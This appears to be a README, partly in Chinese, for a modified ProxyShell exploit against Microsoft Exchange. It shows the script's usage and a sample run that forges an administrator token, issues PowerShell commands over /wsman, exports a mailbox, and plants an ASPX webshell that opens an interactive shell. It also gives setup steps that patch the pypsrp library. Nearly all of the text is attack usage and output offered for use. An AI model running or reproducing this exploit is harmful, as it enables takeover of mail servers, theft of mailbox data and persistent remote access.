# ProxyShell
ProxyShell 漏洞poc
## 改造ProxyShell poc

    usage: proxyshell.py -u url -e emai
    
    proxyshell_rce.py -u https://192.168.31.60 -e administrator@xxxx.com
    
    LegacyDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=937c6ca77fe448969b4d5c8f5a5c55b3-Admin
    SID: S-1-5-21-484177469-2149344085-4186611703-500
    
    Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBZhZG1pbmlzdHJhdG9yQGN1YmUuY29tVSxTLTEtNS0yMS00ODQxNzc0NjktMjE0OTM0NDA4NS00MTg2NjExNzAzLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
    
    PS> dropshell
    
    8000
    
    127.0.0.1 - - [08/Sep/2021 10:27:51] "POST /wsman HTTP/1.1" 200 -
    
    127.0.0.1 - - [08/Sep/2021 10:27:52] "POST /wsman HTTP/1.1" 200 -
    
    127.0.0.1 - - [08/Sep/2021 10:27:53] "POST /wsman HTTP/1.1" 200 -
    
    127.0.0.1 - - [08/Sep/2021 10:27:53] "POST /wsman HTTP/1.1" 200 -
    
    127.0.0.1 - - [08/Sep/2021 10:27:53] "POST /wsman HTTP/1.1" 200 -
    
    127.0.0.1 - - [08/Sep/2021 10:27:54] "POST /wsman HTTP/1.1" 200 -
    
    OUTPUT:
    
    Mailbox Import Export-Administrator-15
    
    ERROR:
    
    
    127.0.0.1 - - [08/Sep/2021 10:27:54] "POST /wsman HTTP/1.1" 200 -
    
    127.0.0.1 - - [08/Sep/2021 10:27:55] "POST /wsman HTTP/1.1" 200 -
    
    OUTPUT:
    
    xxxx.com/Users/Administrator\MailboxExport2
    
    ERROR:
    
    
    Shell URL: https://192.168.31.60/aspnet_client/igejolgyhzkywvxz.aspx
    
    Testing shell 0
    
    Testing shell 1
    
    Shell>




需要安装
pip3 install pypsrp

并使用wsman.py替换掉site-packages/pypsrp/wsman.py

cp wsman.py venv/lib/*/site-packages/pypsrp/wsman.py
Reference:

- 1.https://github.com/ktecv2000/ProxyShell

- 2.https://raw.githubusercontent.com/Ridter/proxyshell_payload

- 3.https://github.com/dmaasland/proxyshell-poc